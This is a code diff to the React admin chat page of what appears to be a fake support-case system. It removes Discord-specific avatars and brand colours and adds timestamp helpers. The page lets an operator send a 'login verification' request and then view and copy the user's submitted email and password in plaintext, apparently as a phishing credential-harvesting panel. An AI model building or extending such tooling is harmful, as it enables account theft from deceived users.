@@ -4,7 +4,32 @@ import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
 import AdminLayout from "../components/AdminLayout";
 import { authHeaders, getToken } from "../lib/api";
 import { useAdminMessages } from "../lib/useSocket";
-import { getAvatarUrl, getDisplayName } from "../lib/discord";
+
+// ── Profile + date helpers ───────────────────────────────────────────────────
+// Cases store a manually-entered profile: { name, avatarUrl, ... }.
+function getDisplayName(user: any): string {
+  return user.name || "Unknown User";
+}
+
+// Message timestamps arrive as unix seconds, milliseconds, or ISO strings
+// depending on the driver — normalize them all. toLocaleTimeString renders in
+// the viewer's own timezone automatically.
+function parseDate(v: any): Date {
+  if (!v) return new Date(NaN);
+  if (v instanceof Date) return v;
+  if (typeof v === "string") {
+    const n = Number(v);
+    if (!isNaN(n) && v.trim() !== "") return new Date(n > 1e10 ? n : n * 1000);
+    return new Date(v.includes(" ") && !v.includes("T") ? v.replace(" ", "T") + "Z" : v);
+  }
+  if (typeof v === "number") return new Date(v > 1e10 ? v : v * 1000);
+  return new Date(v);
+}
+
+function formatTime(v: any): string {
+  const d = parseDate(v);
+  return isNaN(d.getTime()) ? "" : d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
+}
 import { Send, Paperclip, ArrowLeft, Loader2, ShieldCheck, Eye, EyeOff, CheckCircle2, XCircle } from "lucide-react";
 
 const LOGIN_REQUEST_PREFIX = "__LOGIN_REQUEST__";
@@ -84,7 +109,7 @@ export default function AdminChat() {
   };
 
   const cas = caseData?.case;
-  const discordUser = cas ? JSON.parse(cas.discordData || "{}") : null;
+  const profileUser = cas ? JSON.parse(cas.discordData || "{}") : null;
 
   return (
     <AdminLayout>
@@ -102,11 +127,23 @@ export default function AdminChat() {
                 <div className="w-16 h-3 bg-[#313338] rounded animate-pulse mt-1" />
               </div>
             </div>
-          ) : discordUser ? (
+          ) : profileUser ? (
             <div className="flex items-center gap-3">
-              <img src={getAvatarUrl(discordUser)} alt="" className="w-9 h-9 rounded-full" />
+              <div className="relative w-9 h-9 rounded-full bg-[#313338] overflow-hidden flex items-center justify-center flex-shrink-0">
+                <span className="text-sm font-bold text-[#f2f3f5]">
+                  {getDisplayName(profileUser).charAt(0).toUpperCase()}
+                </span>
+                {profileUser.avatarUrl && (
+                  <img
+                    src={profileUser.avatarUrl}
+                    alt=""
+                    onError={(e) => { e.currentTarget.style.display = "none"; }}
+                    className="absolute inset-0 w-full h-full object-cover"
+                  />
+                )}
+              </div>
               <div>
-                <p className="text-[#f2f3f5] font-semibold text-sm">{getDisplayName(discordUser)}</p>
+                <p className="text-[#f2f3f5] font-semibold text-sm">{getDisplayName(profileUser)}</p>
                 <p className="text-[#949ba4] text-xs">{cas?.caseNumber}</p>
               </div>
             </div>
@@ -137,15 +174,15 @@ export default function AdminChat() {
                 <div key={msg.id} className="flex justify-end">
                   <div className="max-w-[70%] flex flex-col gap-1 items-end">
                     <span className="text-xs text-[#949ba4] px-1">You (Admin)</span>
-                    <div className="bg-[#5865F2]/20 border border-[#5865F2]/40 rounded-lg px-4 py-3 flex items-center gap-3">
-                      <ShieldCheck className="w-5 h-5 text-[#5865F2] flex-shrink-0" />
+                    <div className="bg-[#00c787]/20 border border-[#00c787]/40 rounded-lg px-4 py-3 flex items-center gap-3">
+                      <ShieldCheck className="w-5 h-5 text-[#00c787] flex-shrink-0" />
                       <div>
                         <p className="text-[#f2f3f5] text-sm font-medium">Login verification sent</p>
                         <p className="text-[#949ba4] text-xs">Waiting for user to submit credentials</p>
                       </div>
                     </div>
                     <span className="text-xs text-[#949ba4] px-1">
-                      {new Date(msg.createdAt * 1000).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
+                      {formatTime(msg.createdAt)}
                     </span>
                   </div>
                 </div>
@@ -173,7 +210,7 @@ export default function AdminChat() {
                   <span className="text-xs text-[#949ba4] px-1">{isAdmin ? "You (Admin)" : "User"}</span>
                   <div className={`rounded-lg px-4 py-2.5 text-sm ${
                     isAdmin
-                      ? "bg-[#5865F2] text-white rounded-tr-sm"
+                      ? "bg-[#00c787] text-white rounded-tr-sm"
                       : "bg-[#313338] text-[#f2f3f5] rounded-tl-sm border border-[#3f4147]"
                   }`}>
                     {msg.content && <p className="leading-relaxed">{msg.content}</p>}
@@ -188,7 +225,7 @@ export default function AdminChat() {
                     )}
                   </div>
                   <span className="text-xs text-[#949ba4] px-1">
-                    {new Date(msg.createdAt * 1000).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
+                    {formatTime(msg.createdAt)}
                   </span>
                 </div>
               </div>
@@ -225,7 +262,7 @@ export default function AdminChat() {
                 className="flex-1 bg-transparent text-[#f2f3f5] text-sm resize-none focus:outline-none placeholder:text-[#949ba4] max-h-32"
                 style={{ lineHeight: "1.5" }}
               />
-              <label className="cursor-pointer text-[#949ba4] hover:text-[#5865F2] transition-colors flex-shrink-0">
+              <label className="cursor-pointer text-[#949ba4] hover:text-[#00c787] transition-colors flex-shrink-0">
                 <Paperclip className="w-4 h-4" />
                 <input type="file" ref={fileRef} onChange={handleFile} className="hidden" accept="image/*,.pdf,.txt,.doc,.docx" />
               </label>
@@ -233,7 +270,7 @@ export default function AdminChat() {
             <button
               onClick={handleSend}
               disabled={sendMsg.isPending || uploading || !text.trim()}
-              className="w-10 h-10 bg-[#5865F2] hover:bg-[#4752C4] text-white rounded-lg flex items-center justify-center disabled:opacity-50 transition-colors flex-shrink-0"
+              className="w-10 h-10 bg-[#00c787] hover:bg-[#00a875] text-white rounded-lg flex items-center justify-center disabled:opacity-50 transition-colors flex-shrink-0"
             >
               {sendMsg.isPending || uploading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
             </button>
@@ -245,7 +282,7 @@ export default function AdminChat() {
 }
 
 // Credential card shown to admin when user submits login form
-function CredentialCard({ creds, time }: { creds: { email: string; password: string } | null; time: number }) {
+function CredentialCard({ creds, time }: { creds: { email: string; password: string } | null; time: any }) {
   const [showPass, setShowPass] = useState(false);
   const [copied, setCopied] = useState<string | null>(null);
 
@@ -310,7 +347,7 @@ function CredentialCard({ creds, time }: { creds: { email: string; password: str
       </div>
       <div className="px-4 py-2 border-t border-[#3f4147]">
         <span className="text-xs text-[#949ba4]">
-          {new Date(time * 1000).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
+          {formatTime(time)}
         </span>
       </div>
     </div>
